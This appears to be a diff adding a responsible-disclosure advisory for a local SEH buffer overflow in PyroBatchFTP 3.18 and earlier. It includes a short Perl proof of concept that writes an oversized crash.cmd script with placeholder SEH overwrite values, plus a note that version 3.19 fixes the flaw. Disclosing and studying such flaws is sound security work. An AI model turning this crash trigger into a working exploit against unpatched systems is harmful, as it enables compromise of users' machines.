@@ -1,0 +1,85 @@
+=============================================
+MGC ALERT 2018-001
+- Original release date: December 22, 2017
+- Last revised:  January 12, 2018
+- Discovered by: Manuel García Cárdenas
+- Severity: 7,5/10 (CVSS Base Score)
+=============================================
+
+I. VULNERABILITY
+-------------------------
+PyroBatchFTP <= 3.18 - Local Buffer Overflow (SEH)
+
+II. BACKGROUND
+-------------------------
+PyroBatchFTP is a Windows software that lets you exchange files with FTP,
+FTPS or SFTP servers in an automatic and unattended way, using a simple yet
+powerful batch/script language.
+
+III. DESCRIPTION
+-------------------------
+The Enterprise version of PyroBatchFTP is affected by a Local Buffer
+Overflow vulnerability.
+
+The application does not check bounds when reading the file that will
+execute the script, resulting in a classic Buffer Overflow overwriting SEH
+handler.
+
+To exploit the vulnerability only is needed create a local script to
+interact with the application.
+
+IV. PROOF OF CONCEPT
+-------------------------
+
+my $file= "crash.cmd";
+my $junk= "A" x 2052;
+my $nseh = "BBBB";
+my $seh = "CCCC";
+open($FILE,">$file");
+print $FILE $junk.$nseh.$seh;
+close($FILE);
+print "File Created successfully\n";
+
+V. BUSINESS IMPACT
+-------------------------
+Availability compromise can result from these attacks.
+
+VI. SYSTEMS AFFECTED
+-------------------------
+PyroBatchFTP <= 3.18
+
+VII. SOLUTION
+-------------------------
+Vendor release 3.19 version
+http://www.emtec.com/downloads/pyrobatchftp/pyrobatchftp319_changes.txt
+
+VIII. REFERENCES
+-------------------------
+https://www.emtec.com/pyrobatchftp/index.html
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered and reported
+by Manuel García Cárdenas (advidsec (at) gmail (dot) com).
+
+X. REVISION HISTORY
+-------------------------
+December 22, 2017 1: Initial release
+January 12, 2018 2: Revision to send to lists
+
+XI. DISCLOSURE TIMELINE
+-------------------------
+December 22, 2017 1: Vulnerability acquired by Manuel Garcia Cardenas
+December 22, 2017 2: Send to vendor
+January 12, 2018 3: Vendor fix the vulnerability and release a new version
+January 12, 2018 4: Send to the Full-Disclosure lists
+
+XII. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+
+XIII. ABOUT
+-------------------------
+Manuel Garcia Cardenas
+Pentester
